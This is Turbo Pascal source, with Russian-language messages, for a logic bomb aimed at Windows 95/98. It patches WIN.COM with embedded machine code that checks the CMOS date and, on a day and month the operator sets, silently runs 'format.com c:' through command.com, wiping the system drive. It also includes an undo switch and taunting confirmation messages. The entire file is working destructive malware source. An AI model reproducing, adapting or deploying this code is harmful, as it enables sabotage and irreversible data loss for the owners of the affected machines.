  uses Dos;

  label
    Found,
    Found1;

  var
    F: file;
    StartCode: array[0..270] of byte;
    GotoC, GotoCode: array[0..3] of byte;
    Size, s1: word;
    str2, str, Line, WinPath: string;
    D, M: byte;
    C: char;
begin
  str := 'Written by SMT for Mihan...';
  Line := 'Copyright (c)1998 by SMT, Licensed to Mihan';
  if (ParamCount=1) and ((ParamStr(1)='/undestroy') or (ParamStr(1)='-undestroy')) then begin
    Write('Select windows directory: ');
    ReadLn(Winpath);
    Assign(F, Winpath+'\win.com');
    {$I-}
    Reset(F, 1);
    {$I+}
    if IOResult <> 0 then begin
      Writeln('Wrong windir');
      Halt(1);
    end;
    s1 := filesize(F);
    Seek(F, FileSize(F)-4);
    BlockRead(F, GotoCode, 4);
    if char(Gotocode[3]) <> 'S' then begin
      Writeln('Не вижу опасности.');
      Halt(2);
    end;
    Seek(F, 0);
    BlockWrite(F, GotoCode, 3);
    Seek(F, FileSize(F)-2);
    BlockWrite(F, StartCode, 4);
    Close(F);
    Writeln('OK');
    Halt;
  end;


  FillChar(StartCode, sizeof(StartCode), $90);
  Str2 := str+Line;

StartCode[0] := 176;
StartCode[1] := 8;
StartCode[2] := 230;
StartCode[3] := 112;
StartCode[4] := 230;
StartCode[5] := 235;
StartCode[6] := 230;
StartCode[7] := 235;
StartCode[8] := 228;
StartCode[9] := 113;
StartCode[10] := 230;
StartCode[11] := 235;
StartCode[12] := 230;
StartCode[13] := 235;
StartCode[14] := 60;
StartCode[15] := 1;
StartCode[16] := 117;
StartCode[17] := 18;
StartCode[18] := 176;
StartCode[19] := 7;
StartCode[20] := 230;
StartCode[21] := 112;
StartCode[22] := 230;
StartCode[23] := 235;
StartCode[24] := 230;
StartCode[25] := 235;
StartCode[26] := 228;
StartCode[27] := 113;
StartCode[28] := 230;
StartCode[29] := 235;
StartCode[30] := 230;
StartCode[31] := 235;
StartCode[32] := 60;
StartCode[33] := 1;
StartCode[34] := 125;
StartCode[35] := 18;
StartCode[36] := 176;
StartCode[37] := 0;
StartCode[38] := 46;
StartCode[39] := 162;
StartCode[40] := 0;
StartCode[41] := 1;
StartCode[42] := 184;
StartCode[43] := 0;
StartCode[44] := 0;
StartCode[45] := 46;
StartCode[46] := 163;
StartCode[47] := 1;
StartCode[48] := 1;
StartCode[49] := 184;
StartCode[50] := 0;
StartCode[51] := 1;
StartCode[52] := 255;
StartCode[53] := 224;
StartCode[54] := 140;
StartCode[55] := 200;
StartCode[56] := 142;
StartCode[57] := 216;
StartCode[58] := 142;
StartCode[59] := 192;
StartCode[60] := 190;
StartCode[61] := 0;
StartCode[62] := 0;
StartCode[63] := 191;
StartCode[64] := 0;
StartCode[65] := 1;
StartCode[66] := 252;
StartCode[67] := 139;
StartCode[68] := 207;
StartCode[69] := 139;
StartCode[70] := 193;
StartCode[71] := 243;
StartCode[72] := 164;
StartCode[73] := 255;
StartCode[74] := 224;
StartCode[75] := 187;

StartCode[76] := 0; { bx value for INT 4a }
StartCode[77] := 16;

StartCode[78] := 180;
StartCode[79] := 74;
StartCode[80] := 205;
StartCode[81] := 33;
StartCode[82] := 140;
StartCode[83] := 200;
StartCode[84] := 142;
StartCode[85] := 216;
StartCode[86] := 142;
StartCode[87] := 192;
StartCode[88] := 186;
StartCode[89] := 64;
StartCode[90] := 1;
StartCode[91] := 187;
StartCode[92] := 112;
StartCode[93] := 1;
StartCode[94] := 46;
StartCode[95] := 163;
StartCode[96] := 116;
StartCode[97] := 1;
StartCode[98] := 184;
StartCode[99] := 0;
StartCode[100] := 75;
{             Set stack
StartCode[101] := 188;
StartCode[102] := 64;
StartCode[103] := 1;
}
StartCode[104] := 205;
StartCode[105] := 33;
StartCode[106] := 235;
StartCode[107] := 184;

  Writeln('Designed for Windows95/Windows98');
  Str := FSearch('greatest.txt', 'c:\sys\heap');
  {$B-}
  if ( str[0]<>char(0) ) and (ParamStr(1)<>'d') then begin
    Writeln('Ну вот я и дома...');
    Halt;
  end;
  asm
    mov al,8
    out 70h, al
    out $eb, al
    out $eb, al
    in al, 71h
    mov M, al
    mov al,7
    out 70h, al
    out $eb, al
    out $eb, al
    in al, 71h
    mov D, al
  end;
  Writeln('Day=', D, '  Month=', M);
  Writeln('Enter Day1 Month1 Windows_directory');Read(d, m);
  StartCode[15] := M; { date }
  StartCode[33] := D; { date }
  ReadLn(WinPath);
  while Winpath[1] = ' ' do Delete(Winpath, 1, 1);
  while WinPath[byte(WinPath[0])]=' ' do dec(WinPath[0]);
  Assign(F, WinPath+'\command\format.com');
  {$I-}
  Reset(F, 1);
  {$I+}
  if IOResult<>0 then begin
    Writeln('Алгоритм уничтожения не найден.');
    Halt(1);
  end;
  Close(F);

  Assign(F, Winpath+'\command.com');
  {$I-}
  Reset(F, 1);
  {$I+}
  if IOResult <> 0 then begin
    Writeln('Здесь нет Windows.');
    Halt(1);
  end;
  Assign(F, Winpath+'\win.com'); { WIN.COM - check date when starting windows }
  {$I-}
  Reset(F, 1);
  {$I+}
  if IOResult <> 0 then begin
    Writeln('Здесь нет Windows.');
    Halt(1);
  end;

  Size := FileSize(F);
  Seek(F, Size-1);
  BlockRead(F, c, 1);
  if c = 'S' then begin
    WriteLn('Здесь бомба уже поставлена');
    Close(F);
    Halt(2);
  end;
  Seek(F, 0);
  BlockRead(F, Gotocode[0], 3);
  Seek(F, 0);
  StartCode[$25] := Gotocode[0]; { win:100h - original values }
  Startcode[$2b] := Gotocode[1];
  Startcode[$2c] := gotocode[2];
  Move(GotoCode, GotoC, 4);

  Gotocode[0] := $e9;
  GotoCode[1] := (Size-3) mod 256;
  Gotocode[2] := (Size-3) div 256;
  BlockWrite(F, GotoCode, 3);

  s1 := size + $80; { pointer to params }
  StartCode[$72] := s1 mod 256;
  StartCode[$73] := s1 div 256;

  s1 := size + $14b; { source index }
  StartCode[$3d] := s1 mod 256;
  StartCode[$3e] := s1 div 256;

  StartCode[$bd] := 128; { move param offset to EPB }
  StartCode[$be] := 1;

  Line := '/c echo y | ' +WinPath+ '\command\format.com c: >nul' +char(13);
  Move(Line, StartCode[$cb], 60);
  Dec(StartCode[$cb]);
  Line := Winpath + '\'+ 'command.com'+char(0);
  Move(Line[1], StartCode[$8b], 47);
  Seek(F, size);
  BlockWrite(F, StartCode, Sizeof(startcode));
  BlockWrite(F, Str2[1], Length(Str2));
  GotoC[3] := byte('S');
  BlockWrite(F, Gotoc, 4);
  Close(F);
  Writeln('Итак, ', D, '-го числа ', M, '-го месяца FAT диска с: будет уничтожена!!!');
  Write('Подтверждаете (y/n) ?');
  repeat
    Read(C);
  until c in ['y', 'n', 'Y', 'N'];
  if c in ['N', 'n'] then
    Writeln(#10#13'К сожалению, отказываться уже поздно :-(') else
    WriteLn('OK');
  Halt;
end.